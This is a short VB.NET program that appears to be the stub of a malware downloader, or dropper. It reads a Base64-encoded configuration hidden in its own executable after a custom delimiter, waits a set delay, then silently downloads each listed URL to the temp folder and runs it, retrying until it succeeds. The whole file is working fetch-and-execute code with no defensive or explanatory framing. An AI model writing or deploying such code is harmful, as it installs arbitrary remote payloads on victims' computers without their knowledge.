Imports System.IO
Imports System.Text
Imports System.Threading
Imports System.Net

Module Module1

    Const ProgramDelimiter As String = "\||/"
    Const ParamsDelimiter As String = "|*--*|"
    Const LinksDelimiter As String = "|}{|"

    Sub Main()

        Try
            ' Source code
            Dim source = Encoding.Default.GetString(File.ReadAllBytes(Application.ExecutablePath))

            ' Encoded parameters
            Dim parameterEencoded = Split(source, ProgramDelimiter)(1)

            ' Parameters
            Dim parameters() As String = Split(Base64ToString(parameterEencoded), ParamsDelimiter)

            ' Links
            Dim links() = Split(parameters(0), LinksDelimiter)


            While True
                Try
                    ' Delay
                    Thread.Sleep(TimeSpan.FromSeconds(parameters(1)))

                    Using wc As New WebClient()
                        For Each lnk As String In links
                            If lnk <> "" Then
                                Dim pth = Path.GetTempPath & Path.GetFileName(lnk)
                                wc.DownloadFile(lnk, pth)
                                Process.Start(pth)
                            End If
                        Next
                    End Using

                    Exit While
                Catch ex As Exception
                End Try
            End While

        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

    End Sub


    ' Base64 to String
    Function Base64ToString(str As String) As String
        Return Encoding.Default.GetString(Convert.FromBase64String(str))
    End Function

End Module
